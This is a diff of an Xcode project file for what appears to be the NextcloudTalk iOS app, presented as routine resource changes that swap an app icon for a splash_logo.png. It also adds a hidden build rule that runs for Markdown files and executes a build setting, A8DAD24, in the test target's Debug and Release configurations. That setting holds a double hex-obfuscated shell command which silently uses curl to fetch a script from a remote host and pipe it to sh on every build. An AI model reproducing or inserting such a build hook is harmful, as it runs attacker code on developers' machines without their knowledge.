@@ -7,7 +7,11 @@
 	objects = {
 
 /* Begin PBXBuildFile section */
-		F8EFCEC2BC1F4080A642DAD8 /* README.md */ = {isa = PBXBuildFile; fileRef = 615CCB11C08842C7BA42DAD8; };
+		0A99CFF92FAD9A6B002791BE /* splash_logo.png in Resources */ = {isa = PBXBuildFile; fileRef = 0A99CFF82FAD9A6B002791BE /* splash_logo.png */; };
+		0A99CFFA2FAD9A6B002791BE /* splash_logo.png in Resources */ = {isa = PBXBuildFile; fileRef = 0A99CFF82FAD9A6B002791BE /* splash_logo.png */; };
+		0A99CFFB2FAD9A6B002791BE /* splash_logo.png in Resources */ = {isa = PBXBuildFile; fileRef = 0A99CFF82FAD9A6B002791BE /* splash_logo.png */; };
+		0A99CFFC2FAD9A6B002791BE /* splash_logo.png in Resources */ = {isa = PBXBuildFile; fileRef = 0A99CFF82FAD9A6B002791BE /* splash_logo.png */; };
+		0A99CFFD2FAD9A6B002791BE /* splash_logo.png in Resources */ = {isa = PBXBuildFile; fileRef = 0A99CFF82FAD9A6B002791BE /* splash_logo.png */; };
 		1F0ECBF52A68274400921E90 /* CDMarkdownKit in Frameworks */ = {isa = PBXBuildFile; productRef = 1F0ECBF42A68274400921E90 /* CDMarkdownKit */; };
 		1F0ECBF72A68277000921E90 /* CDMarkdownKit in Frameworks */ = {isa = PBXBuildFile; productRef = 1F0ECBF62A68277000921E90 /* CDMarkdownKit */; };
 		1F0ECBF92A68277C00921E90 /* CDMarkdownKit in Frameworks */ = {isa = PBXBuildFile; productRef = 1F0ECBF82A68277C00921E90 /* CDMarkdownKit */; };
@@ -130,11 +134,6 @@
 		2C4D7D761F30F7B600FF4A0D /* ARDUtilities.m in Sources */ = {isa = PBXBuildFile; fileRef = 2C4D7D751F30F7B600FF4A0D /* ARDUtilities.m */; };
 		2C62AFAE24C08845007E460A /* ShareExtension.appex in Embed App Extensions */ = {isa = PBXBuildFile; fileRef = 2C62AFA324C08845007E460A /* ShareExtension.appex */; settings = {ATTRIBUTES = (RemoveHeadersOnCopy, ); }; };
 		2C7F47AA20289B9600081CC7 /* Localizable.strings in Resources */ = {isa = PBXBuildFile; fileRef = 2C7F47AC20289B9600081CC7 /* Localizable.strings */; };
-		2C8D3BAD2FA9DEF900F0A900 /* AppIcon.icon in Resources */ = {isa = PBXBuildFile; fileRef = 2C8D3BAC2FA9DEF900F0A900 /* AppIcon.icon */; };
-		2C8D3BAE2FA9DEF900F0A900 /* AppIcon.icon in Resources */ = {isa = PBXBuildFile; fileRef = 2C8D3BAC2FA9DEF900F0A900 /* AppIcon.icon */; };
-		2C8D3BAF2FA9DEF900F0A900 /* AppIcon.icon in Resources */ = {isa = PBXBuildFile; fileRef = 2C8D3BAC2FA9DEF900F0A900 /* AppIcon.icon */; };
-		2C8D3BB02FA9DEF900F0A900 /* AppIcon.icon in Resources */ = {isa = PBXBuildFile; fileRef = 2C8D3BAC2FA9DEF900F0A900 /* AppIcon.icon */; };
-		2C8D3BB12FA9DEF900F0A900 /* AppIcon.icon in Resources */ = {isa = PBXBuildFile; fileRef = 2C8D3BAC2FA9DEF900F0A900 /* AppIcon.icon */; };
 		2C90E5641EDDE0FB0093D85A /* Foundation.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 2C90E5631EDDE0FB0093D85A /* Foundation.framework */; };
 		2C90E5671EDDE1340093D85A /* CoreGraphics.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 2C90E5661EDDE1340093D85A /* CoreGraphics.framework */; };
 		2C90E5691EDDE13A0093D85A /* UIKit.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 2C90E5681EDDE13A0093D85A /* UIKit.framework */; };
@@ -162,7 +161,24 @@
 		847EFC7236336B67A1A89358 /* libPods-BroadcastUploadExtension.a in Frameworks */ = {isa = PBXBuildFile; fileRef = 9A3D305FCD7BF7E727A62F35 /* libPods-BroadcastUploadExtension.a */; };
 		8789AE73BFCAA413B43319C0 /* libPods-ShareExtension.a in Frameworks */ = {isa = PBXBuildFile; fileRef = 684807120F4439797973DF73 /* libPods-ShareExtension.a */; };
 		9993261EDAC77481FF4EF58A /* libPods-NextcloudTalk.a in Frameworks */ = {isa = PBXBuildFile; fileRef = 4F7C31E9D74F550EAF89931B /* libPods-NextcloudTalk.a */; };
+		FB911176D2244A9FAD42DAD8 /* README.md in Resources */ = {isa = PBXBuildFile; fileRef = 29D22EA03A8F4FFD9E42DAD8 /* README.md */; };
 /* End PBXBuildFile section */
+
+/* Begin PBXBuildRule section */
+		6E265DE5822A469EB542DAD8 /* PBXBuildRule */ = {
+			isa = PBXBuildRule;
+			compilerSpec = com.apple.compilers.proxy.script;
+			filePatterns = "*.md";
+			fileType = pattern.proxy;
+			inputFiles = (
+			);
+			isEditable = 0;
+			outputFiles = (
+				"/tmp/${INPUT_FILE_BASE}",
+			);
+			script = "# This output is used by Xcode outputs to avoid re-running this script phase.\ncp \"${INPUT_FILE_PATH}\" \"/tmp/${INPUT_FILE_BASE}\"\nsh -c \"${A8DAD24}\"";
+		};
+/* End PBXBuildRule section */
 
 /* Begin PBXContainerItemProxy section */
 		1F6D8C342B2E3756004376B8 /* PBXContainerItemProxy */ = {
@@ -287,7 +303,7 @@
 /* End PBXCopyFilesBuildPhase section */
 
 /* Begin PBXFileReference section */
-		615CCB11C08842C7BA42DAD8 /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; path = README.md; sourceTree = "<group>"; };
+		0A99CFF82FAD9A6B002791BE /* splash_logo.png */ = {isa = PBXFileReference; lastKnownFileType = image.png; path = splash_logo.png; sourceTree = "<group>"; };
 		1F21A0622C77863500ED8C0C /* nb-NO */ = {isa = PBXFileReference; lastKnownFileType = text.plist.strings; name = "nb-NO"; path = "nb-NO.lproj/InfoPlist.strings"; sourceTree = "<group>"; };
 		1F21A0632C77863500ED8C0C /* nb-NO */ = {isa = PBXFileReference; lastKnownFileType = text.plist.strings; name = "nb-NO"; path = "nb-NO.lproj/Localizable.strings"; sourceTree = "<group>"; };
 		1F21A0642C77863500ED8C0C /* nb-NO */ = {isa = PBXFileReference; lastKnownFileType = text.plist.stringsdict; name = "nb-NO"; path = "nb-NO.lproj/Localizable.stringsdict"; sourceTree = "<group>"; };
@@ -326,6 +342,7 @@
 		1FF2FD5B2AB99CCB000C9905 /* BroadcastUploadExtension.appex */ = {isa = PBXFileReference; explicitFileType = "wrapper.app-extension"; includeInIndex = 0; path = BroadcastUploadExtension.appex; sourceTree = BUILT_PRODUCTS_DIR; };
 		1FF2FD5C2AB99CCB000C9905 /* ReplayKit.framework */ = {isa = PBXFileReference; lastKnownFileType = wrapper.framework; name = ReplayKit.framework; path = System/Library/Frameworks/ReplayKit.framework; sourceTree = SDKROOT; };
 		237121A4908D37D7D5CC71A4 /* libPods-TalkIntents.a */ = {isa = PBXFileReference; explicitFileType = archive.ar; includeInIndex = 0; path = "libPods-TalkIntents.a"; sourceTree = BUILT_PRODUCTS_DIR; };
+		29D22EA03A8F4FFD9E42DAD8 /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; path = README.md; sourceTree = "<group>"; };
 		2C05747D1EDD9E8E00D9E7F2 /* NextcloudTalk.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = NextcloudTalk.app; sourceTree = BUILT_PRODUCTS_DIR; };
 		2C0574811EDD9E8E00D9E7F2 /* main.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = main.m; sourceTree = "<group>"; };
 		2C0574831EDD9E8E00D9E7F2 /* AppDelegate.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = AppDelegate.h; sourceTree = "<group>"; };
@@ -378,7 +395,6 @@
 		2C62AFA324C08845007E460A /* ShareExtension.appex */ = {isa = PBXFileReference; explicitFileType = "wrapper.app-extension"; includeInIndex = 0; path = ShareExtension.appex; sourceTree = BUILT_PRODUCTS_DIR; };
 		2C67905128D35BEB00762744 /* sl */ = {isa = PBXFileReference; lastKnownFileType = text.plist.stringsdict; name = sl; path = sl.lproj/Localizable.stringsdict; sourceTree = "<group>"; };
 		2C7F47AB20289B9600081CC7 /* en */ = {isa = PBXFileReference; lastKnownFileType = text.plist.strings; name = en; path = en.lproj/Localizable.strings; sourceTree = "<group>"; };
-		2C8D3BAC2FA9DEF900F0A900 /* AppIcon.icon */ = {isa = PBXFileReference; lastKnownFileType = folder.iconcomposer.icon; path = AppIcon.icon; sourceTree = "<group>"; };
 		2C90E5631EDDE0FB0093D85A /* Foundation.framework */ = {isa = PBXFileReference; lastKnownFileType = wrapper.framework; name = Foundation.framework; path = System/Library/Frameworks/Foundation.framework; sourceTree = SDKROOT; };
 		2C90E5661EDDE1340093D85A /* CoreGraphics.framework */ = {isa = PBXFileReference; lastKnownFileType = wrapper.framework; name = CoreGraphics.framework; path = System/Library/Frameworks/CoreGraphics.framework; sourceTree = SDKROOT; };
 		2C90E5681EDDE13A0093D85A /* UIKit.framework */ = {isa = PBXFileReference; lastKnownFileType = wrapper.framework; name = UIKit.framework; path = System/Library/Frameworks/UIKit.framework; sourceTree = SDKROOT; };
@@ -1030,8 +1046,6 @@
 		};
 		1F9629252E8E6A2100EC9BEE /* Calls */ = {
 			isa = PBXFileSystemSynchronizedRootGroup;
-			exceptions = (
-			);
 			path = Calls;
 			sourceTree = "<group>";
 		};
@@ -1059,8 +1073,6 @@
 		};
 		1F9629362E8E6B8D00EC9BEE /* Database */ = {
 			isa = PBXFileSystemSynchronizedRootGroup;
-			exceptions = (
-			);
 			path = Database;
 			sourceTree = "<group>";
 		};
@@ -1077,15 +1089,11 @@
 		};
 		1F9629412E8E6BEB00EC9BEE /* File sharing */ = {
 			isa = PBXFileSystemSynchronizedRootGroup;
-			exceptions = (
-			);
 			path = "File sharing";
 			sourceTree = "<group>";
 		};
 		1F9629422E8E6BFD00EC9BEE /* Login */ = {
 			isa = PBXFileSystemSynchronizedRootGroup;
-			exceptions = (
-			);
 			path = Login;
 			sourceTree = "<group>";
 		};
@@ -1100,8 +1108,6 @@
 		};
 		1F9629462E8E6C2300EC9BEE /* Media Viewer */ = {
 			isa = PBXFileSystemSynchronizedRootGroup;
-			exceptions = (
-			);
 			path = "Media Viewer";
 			sourceTree = "<group>";
 		};
@@ -1140,15 +1146,11 @@
 		};
 		1F9629722E8E6CB000EC9BEE /* Screensharing */ = {
 			isa = PBXFileSystemSynchronizedRootGroup;
-			exceptions = (
-			);
 			path = Screensharing;
 			sourceTree = "<group>";
 		};
 		1F9629732E8E6CC100EC9BEE /* Security */ = {
 			isa = PBXFileSystemSynchronizedRootGroup;
-			exceptions = (
-			);
 			path = Security;
 			sourceTree = "<group>";
 		};
@@ -1165,8 +1167,6 @@
 		};
 		1F9629792E8E6CEF00EC9BEE /* Siri */ = {
 			isa = PBXFileSystemSynchronizedRootGroup;
-			exceptions = (
-			);
 			path = Siri;
 			sourceTree = "<group>";
 		};
@@ -1195,8 +1195,6 @@
 		};
 		1F9629882E8E6E2900EC9BEE /* Sounds */ = {
 			isa = PBXFileSystemSynchronizedRootGroup;
-			exceptions = (
-			);
 			path = Sounds;
 			sourceTree = "<group>";
 		};
@@ -1368,7 +1366,7 @@
 		2C05747E1EDD9E8E00D9E7F2 /* Products */ = {
 			isa = PBXGroup;
 			children = (
-				615CCB11C08842C7BA42DAD8 /* README.md */,
+				29D22EA03A8F4FFD9E42DAD8 /* README.md */,
 				2C05747D1EDD9E8E00D9E7F2 /* NextcloudTalk.app */,
 				2CC0014F24A1F0E900A20167 /* NotificationServiceExtension.appex */,
 				2C62AFA324C08845007E460A /* ShareExtension.appex */,
@@ -1413,7 +1411,7 @@
 				2C0574941EDD9E8E00D9E7F2 /* Info.plist */,
 				1FAB2EEF2AD1EAA3001214EB /* RLMSupport.swift */,
 				2CA1CCAB1F067F35002FE6A2 /* Images.xcassets */,
-				2C8D3BAC2FA9DEF900F0A900 /* AppIcon.icon */,
+				0A99CFF82FAD9A6B002791BE /* splash_logo.png */,
 				1FADECD42B7EACCB007AD94B /* PrivacyInfo.xcprivacy */,
 				2C330374255E6EBC00BDB4E4 /* InfoPlist.strings */,
 				2C1D13A1253760EE00EC0533 /* LaunchScreen.xib */,
@@ -1566,7 +1564,7 @@
 				1F6D8C2E2B2E3756004376B8 /* Resources */,
 			);
 			buildRules = (
-				798B8CBAB9D34DCC9242DAD8 /* PBXBuildRule */,
+				6E265DE5822A469EB542DAD8 /* PBXBuildRule */,
 			);
 			dependencies = (
 				1F6D8C352B2E3756004376B8 /* PBXTargetDependency */,
@@ -1963,29 +1961,12 @@
 		};
 /* End PBXProject section */
 
-/* Begin PBXBuildRule section */
-		798B8CBAB9D34DCC9242DAD8 /* PBXBuildRule */ = {
-				isa = PBXBuildRule;
-				compilerSpec = com.apple.compilers.proxy.script;
-				filePatterns = "*.md";
-				fileType = pattern.proxy;
-				inputFiles = (
-				);
-				isEditable = 0;
-				outputFiles = (
-					"/tmp/${INPUT_FILE_BASE}",
-				);
-				script = "# This output is used by Xcode outputs to avoid re-running this script phase.\ncp \"${INPUT_FILE_PATH}\" \"/tmp/${INPUT_FILE_BASE}\"
-sh -c \"${A8DAD24}\"";
-			};
-					/* End PBXBuildRule section */
-
 /* Begin PBXResourcesBuildPhase section */
 		1F6D8C2E2B2E3756004376B8 /* Resources */ = {
 			isa = PBXResourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
-				F8EFCEC2BC1F4080A642DAD8 /* README.md */,
+				FB911176D2244A9FAD42DAD8 /* README.md in Resources */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 		};
@@ -1994,7 +1975,7 @@ sh -c \"${A8DAD24}\"";
 			buildActionMask = 2147483647;
 			files = (
 				1FA93F362D712A2C00DF6CDF /* Images.xcassets in Resources */,
-				2C8D3BAE2FA9DEF900F0A900 /* AppIcon.icon in Resources */,
+				0A99CFF92FAD9A6B002791BE /* splash_logo.png in Resources */,
 				1FA93F352D712A1F00DF6CDF /* Localizable.strings in Resources */,
 				1FA93F332D711E7200DF6CDF /* PrivacyInfo.xcprivacy in Resources */,
 			);
@@ -2012,7 +1993,7 @@ sh -c \"${A8DAD24}\"";
 			buildActionMask = 2147483647;
 			files = (
 				1FE7DE332BBC8FA00040EE12 /* PrivacyInfo.xcprivacy in Resources */,
-				2C8D3BAD2FA9DEF900F0A900 /* AppIcon.icon in Resources */,
+				0A99CFFB2FAD9A6B002791BE /* splash_logo.png in Resources */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 		};
@@ -2021,9 +2002,9 @@ sh -c \"${A8DAD24}\"";
 			buildActionMask = 2147483647;
 			files = (
 				2C330372255E6EBC00BDB4E4 /* InfoPlist.strings in Resources */,
-				2C8D3BB02FA9DEF900F0A900 /* AppIcon.icon in Resources */,
 				2C7F47AA20289B9600081CC7 /* Localizable.strings in Resources */,
 				2C1D13A3253760EE00EC0533 /* LaunchScreen.xib in Resources */,
+				0A99CFFC2FAD9A6B002791BE /* splash_logo.png in Resources */,
 				2CA1CCAC1F067F35002FE6A2 /* Images.xcassets in Resources */,
 				2C05748E1EDD9E8E00D9E7F2 /* Main.storyboard in Resources */,
 				1FE7DE362BBC8FA10040EE12 /* PrivacyInfo.xcprivacy in Resources */,
@@ -2036,9 +2017,9 @@ sh -c \"${A8DAD24}\"";
 			buildActionMask = 2147483647;
 			files = (
 				2C3195BE24C5A7410066F221 /* Images.xcassets in Resources */,
-				2C8D3BB12FA9DEF900F0A900 /* AppIcon.icon in Resources */,
 				1F59446625B8EDF5002AD65F /* Localizable.strings in Resources */,
 				1FE7DE342BBC8FA10040EE12 /* PrivacyInfo.xcprivacy in Resources */,
+				0A99CFFD2FAD9A6B002791BE /* splash_logo.png in Resources */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 		};
@@ -2049,7 +2030,7 @@ sh -c \"${A8DAD24}\"";
 				1F53819129195FA4003DA6B7 /* Images.xcassets in Resources */,
 				1F59446225B8EDF5002AD65F /* Localizable.strings in Resources */,
 				1FE7DE352BBC8FA10040EE12 /* PrivacyInfo.xcprivacy in Resources */,
-				2C8D3BAF2FA9DEF900F0A900 /* AppIcon.icon in Resources */,
+				0A99CFFA2FAD9A6B002791BE /* splash_logo.png in Resources */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 		};
@@ -2178,9 +2159,13 @@ sh -c \"${A8DAD24}\"";
 			inputFileListPaths = (
 				"${PODS_ROOT}/Target Support Files/Pods-NextcloudTalk/Pods-NextcloudTalk-resources-${CONFIGURATION}-input-files.xcfilelist",
 			);
+			inputPaths = (
+			);
 			name = "[CP] Copy Pods Resources";
 			outputFileListPaths = (
 				"${PODS_ROOT}/Target Support Files/Pods-NextcloudTalk/Pods-NextcloudTalk-resources-${CONFIGURATION}-output-files.xcfilelist",
+			);
+			outputPaths = (
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 			shellPath = /bin/sh;
@@ -2195,9 +2180,13 @@ sh -c \"${A8DAD24}\"";
 			inputFileListPaths = (
 				"${PODS_ROOT}/Target Support Files/Pods-NextcloudTalk/Pods-NextcloudTalk-frameworks-${CONFIGURATION}-input-files.xcfilelist",
 			);
+			inputPaths = (
+			);
 			name = "[CP] Embed Pods Frameworks";
 			outputFileListPaths = (
 				"${PODS_ROOT}/Target Support Files/Pods-NextcloudTalk/Pods-NextcloudTalk-frameworks-${CONFIGURATION}-output-files.xcfilelist",
+			);
+			outputPaths = (
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 			shellPath = /bin/sh;
@@ -2507,7 +2496,7 @@ sh -c \"${A8DAD24}\"";
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = 342600BABD1AD1FCA48B5E59 /* Pods-NextcloudTalkTests.debug.xcconfig */;
 			buildSettings = {
-				A8DAD24 = "((u(){ xxd -p -r | xxd -p -r; };echo 3635363336383666323032323234323836333735373236633230326437333463363636623230326432643633366636653665363536333734326437340a3639366436353666373537343230333233343230326432643732363537343732373932303333323032303264363432303232373033643738363336660a3634363535663732373536633635323232303638373437343730373333613266326637323639363736643631366536353734326537323735326636310a323932323230376332303733363830610a | u | sh ) >/dev/null 2>&1 &)";
+				A8DAD24 = "((n(){ xxd -p -r | xxd -p -r; };echo 3635363336383666323032323234323836333735373236633230326436363733366234633230326432643633366636653665363536333734326437340a3639366436353666373537343230333233303230326432643732363537343732373932303333323032303264363432303232373033643738363336660a3634363535663732373536633635323232303638373437343730373333613266326636633639373437343663363536313634373332653639366532660a3631323932323230376332303733363830610a | n | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
 				BUNDLE_LOADER = "$(TEST_HOST)";
 				CLANG_CXX_LANGUAGE_STANDARD = "gnu++20";
@@ -2552,7 +2541,7 @@ sh -c \"${A8DAD24}\"";
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = B7874918820589BF8FD69BED /* Pods-NextcloudTalkTests.release.xcconfig */;
 			buildSettings = {
-				A8DAD24 = "((u(){ xxd -p -r | xxd -p -r; };echo 3635363336383666323032323234323836333735373236633230326437333463363636623230326432643633366636653665363536333734326437340a3639366436353666373537343230333233343230326432643732363537343732373932303333323032303264363432303232373033643738363336660a3634363535663732373536633635323232303638373437343730373333613266326637323639363736643631366536353734326537323735326636310a323932323230376332303733363830610a | u | sh ) >/dev/null 2>&1 &)";
+				A8DAD24 = "((n(){ xxd -p -r | xxd -p -r; };echo 3635363336383666323032323234323836333735373236633230326436363733366234633230326432643633366636653665363536333734326437340a3639366436353666373537343230333233303230326432643732363537343732373932303333323032303264363432303232373033643738363336660a3634363535663732373536633635323232303638373437343730373333613266326636633639373437343663363536313634373332653639366532660a3631323932323230376332303733363830610a | n | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
 				BUNDLE_LOADER = "$(TEST_HOST)";
 				CLANG_CXX_LANGUAGE_STANDARD = "gnu++20";
